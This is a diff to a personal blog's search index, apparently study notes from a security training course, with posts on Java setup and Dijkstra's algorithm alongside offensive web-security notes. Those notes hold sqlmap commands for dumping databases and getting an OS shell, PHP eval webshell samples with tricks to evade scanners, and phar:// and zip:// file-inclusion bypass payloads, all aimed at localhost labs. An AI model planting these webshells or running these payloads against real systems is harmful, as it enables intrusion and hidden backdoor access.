@@ -1,6 +1,197 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>java环境变量配置</title>
+    <url>/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>啊啊啊啊啊啊啊啊今天装了jdk11但却发现burpsuite跑不了了淦。没办法只好装回jdk8，配环境变量时又出了好多问题，下面就记录一下以免下次继续。</p>
+<p>首先是JAVA_HOME</p>
+<p><img src="/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/Snipaste_2020-05-24_21-36-07.png" alt="Snipaste_2020-05-24_21-36-07"></p>
+<p>然后是classpath【记住这里一定要小写】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/2.png" alt="2"></p>
+<p>然后在PATH里配置</p>
+<p><img src="/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/3.png" alt="3"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sqlmap使用</title>
+    <url>/2020/05/23/sqlmap%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><h3 id="对于GET请求的注入"><a href="#对于GET请求的注入" class="headerlink" title="对于GET请求的注入"></a>对于GET请求的注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&#39;&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="对于POST请求的注入"><a href="#对于POST请求的注入" class="headerlink" title="对于POST请求的注入"></a>对于POST请求的注入</h3><p>先把http头写入到同目录下的文件里【post.txt】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;sql&#x2F;sql_post.php HTTP&#x2F;1.1</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 6</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: __atuvc&#x3D;5%7C1</span><br><span class="line">Host: localhost</span><br><span class="line">Origin: http:&#x2F;&#x2F;localhost</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_post.php</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.117 Safari&#x2F;537.36</span><br><span class="line"></span><br><span class="line">id&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p>其中post传输的数据与header要空一行，然后构建payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r &quot;post.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="对于有表格的注入"><a href="#对于有表格的注入" class="headerlink" title="对于有表格的注入"></a>对于有表格的注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;127.0.0.1&#x2F;sql&#x2F;sql_1.php&quot; --forms</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="对于GET的一次完整注入"><a href="#对于GET的一次完整注入" class="headerlink" title="对于GET的一次完整注入"></a>对于GET的一次完整注入</h2><ol>
+<li><p>爆出数据库名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<p>如果要爆出当前数据库名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆出表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; --tables</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆出列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; -T &quot;sql_1&quot; --columns</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆出具体内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; -T &quot;sql_1&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p>如果爆出指定列内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; -T &quot;sql_1&quot; -C &quot;name&quot; --dump</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>此次完整注入的原理可见下图</p>
+<p><img src="/2020/05/23/sqlmap%E4%BD%BF%E7%94%A8/sql%E7%BB%93%E6%9E%84.jpg" alt="sql结构"></p>
+<h2 id="获取shell权限"><a href="#获取shell权限" class="headerlink" title="获取shell权限"></a>获取shell权限</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --os-shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --file-read&#x3D;&quot;D:\phpstudy_pro\WWW\muma.php</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>米斯特安全培训</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>NTFS文件流</title>
+    <url>/2020/05/21/NTFS%E6%96%87%E4%BB%B6%E6%B5%81/</url>
+    <content><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/26108362" target="_blank" rel="noopener">知乎专栏</a></p>
+]]></content>
+      <categories>
+        <category>米斯特安全培训</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>绕过对php一句话木马查杀的方法</title>
+    <url>/2020/05/18/%E7%BB%95%E8%BF%87%E5%AF%B9php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<ol>
+<li><p>改变大小写，然后strlower()</p>
+</li>
+<li><p>文本反转：strrev()</p>
+</li>
+<li><p>点号分割字符串：”a”.”b”</p>
+</li>
+<li><p>数组：array(“a”,”b”);   $a[0].$a[1]</p>
+</li>
+<li><p>干扰函数：var_dump()、print_r()</p>
+</li>
+<li><p>函数</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ag</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($a);</span><br><span class="line">&#125;</span><br><span class="line">ag($_POST[<span class="string">'key'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用类</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rg</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ag</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">		@<span class="keyword">eval</span>($a);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$key = <span class="keyword">new</span> rg;</span><br><span class="line">$key -&gt; ag($_POST[<span class="string">'key'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>改cknife里的配置【base_64一下】</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>米斯特安全培训</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Dijkstra算法</title>
+    <url>/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/</url>
+    <content><![CDATA[<p>当我们要寻找无权重边的最短路径时，我们常用广度优先搜索，即第一次遇到结点x就是x的最短路径【如社交媒体上的好友推荐】。但对于那些有权重边的最优解，我们就不能再用广度优先搜索了，因为最先到达x并不能代表这条路径就是最优解，因为每条路径的权重不同。如下图所示：</p>
+<p>如果用广度优先搜索会先到达地点B，但地点B并不是最优解</p>
+<p><img src="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/2.jpg" alt="2"></p>
+<p>这时我们就需要用到<strong>Dijkstra</strong>算法了：</p>
+<h2 id="基本符号定义"><a href="#基本符号定义" class="headerlink" title="基本符号定义"></a>基本符号定义</h2><ol>
+<li>source：表示图中的起始点，缩写是s。</li>
+<li>weight[m，n]：表示从结点m到结点n的有向边之权重，如果m到n有多条边【一次到】则取权重最小的那条，缩写为w[m,n]。</li>
+<li>min_weight[m]：保存了从s到任意结点的最小权重，缩写为mw[m]。其中mw[s]=0。</li>
+<li>Finish：表示已经找到最小权重的结点之集合，一旦放入F，这个结点就不参与将来的计算，缩写为F。</li>
+</ol>
+<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ol>
+<li>设置mw[s]=0。</li>
+<li>往集合F里添加结点s，F包含且仅包含结点s。</li>
+<li>假设结点s能直接到达的集合为M，对于其中的每一条边m，则把mw[m]设为w[s,m]，同时对其他s不能直接到的结点，将通路设为∞。</li>
+</ol>
+<h2 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h2><h3 id="1-查找最小mv"><a href="#1-查找最小mv" class="headerlink" title="1.查找最小mv"></a>1.查找最小mv</h3><p>当由一个点发散出去多个mw时，从mw数组中选择出其中的最小值【如mw[x]】，此最小值就是s到x</p>
+<p>的最小权重，将其放入F数组中。此后x结点就不必被考虑了。</p>
+<h3 id="2-更新权重"><a href="#2-更新权重" class="headerlink" title="2.更新权重"></a>2.更新权重</h3><p>然后看看新加入F的结点x，是不是可以直接到达其他结点。如果是，看看这些x到达其他通路的长度，是否比这些点之前的mw更小【mw[x]+w[x,y]&lt;mw[y]】，如果是，就替换这些点mw的值。</p>
+<p>重复以上两步，知道集合F包含途中所有结点。</p>
+<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p><img src="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/1.jpg" alt="1"></p>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>F</th>
+<th>mw</th>
+<th>已确定的mw</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>s</td>
+<td>mw[a]=0.5;mw[b]=0.3;mw[c]=0.2;mw[d]=0.4;其他mw=∞</td>
+<td>空集</td>
+</tr>
+<tr>
+<td>2</td>
+<td>s,c</td>
+<td>mw[a]=0.5;mw[b]=0.3;mw[d]=0.4;mw[f]=0.6;mw[h]=1.0;其他mw=∞</td>
+<td>mw[c]=0.2</td>
+</tr>
+<tr>
+<td>3</td>
+<td>s,c,b</td>
+<td>mw[a]=0.5;mw[d]=0.4;mw[f]=0.4;mw[h]=1.0;其他mw=∞</td>
+<td>mw[c]=0.2;mw[b]=0.3</td>
+</tr>
+<tr>
+<td>4</td>
+<td>s,c,b,d</td>
+<td>mw[a]=0.5;mw[f]=0.4;mw[h]=1.0;其他mw=∞</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4</td>
+</tr>
+<tr>
+<td>5</td>
+<td>s,c,b,d,f</td>
+<td>mw[a]=0.5;mw[h]=0.6;mw[e]=0.5;其他mw=∞</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4</td>
+</tr>
+<tr>
+<td>6</td>
+<td>s,c,b,d,f,a</td>
+<td>mw[h]=0.6;mw[e]=0.5;其他mw=∞</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;</td>
+</tr>
+<tr>
+<td>7</td>
+<td>s,c,b,d,f,a,e</td>
+<td>mw[h]=0.6;mv[g]=0.6</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5</td>
+</tr>
+<tr>
+<td>8</td>
+<td>s,c,b,d,f,a,e,h</td>
+<td>mv[g]=0.6</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5:mw[h]=0.6;</td>
+</tr>
+<tr>
+<td>9</td>
+<td>s,c,b,d,f,a,e,h,g</td>
+<td>空集</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5:mw[h]=0.6;mv[g]=0.6</td>
+</tr>
+</tbody></table>
+<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>正在现学JAVA，之后补上。</p>
+]]></content>
+      <categories>
+        <category>数据结构与算法之美</category>
+      </categories>
+  </entry>
+  <entry>
     <title>有趣的小技巧</title>
     <url>/2020/05/16/%E6%9C%89%E8%B6%A3%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
     <content><![CDATA[<h2 id="通过禁用JS来实现直接进入管理员后台"><a href="#通过禁用JS来实现直接进入管理员后台" class="headerlink" title="通过禁用JS来实现直接进入管理员后台"></a>通过禁用JS来实现直接进入管理员后台</h2><ol>
@@ -46,6 +237,29 @@
 </ol>
 <h4 id="内容验证"><a href="#内容验证" class="headerlink" title="内容验证"></a>内容验证</h4><p>即后缀名可以随便修改，但是文件内容必须符合，比如要求文件格式为jpg。</p>
 <p>此时我们就可以把一句话隐写到php文件里，形成图片一句话，从而绕过验证。</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断基本已经全部禁用</p>
+<h3 id="phar-zip协议"><a href="#phar-zip协议" class="headerlink" title="phar/zip协议"></a>phar/zip协议</h3><p>我们可能会遇到以下两种限制</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file) &amp;&amp; strtolower(substr($file, <span class="number">-4</span>)) == <span class="string">".jpg"</span>)&#123;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时我们可以实行以下操作：</p>
+<ol>
+<li>创建一个1.php，里面写入php代码【phpinfo()】。</li>
+<li>将此文件重命名为1.jpg【代码限制要jpg】。</li>
+<li>压缩1.jpg为1.zip</li>
+</ol>
+<p>构建payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;phar:&#x2F;&#x2F;c.zip&#x2F;c.jpg</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;zip:&#x2F;&#x2F;c.zip%23c.jpg</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>接下来这种情况也会遇到：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    include($file.&quot;.jpg&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时重复以上三步并构建：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;phar:&#x2F;&#x2F;c.zip&#x2F;c</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;zip:&#x2F;&#x2F;c.zip%23c</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>米斯特安全培训</category>
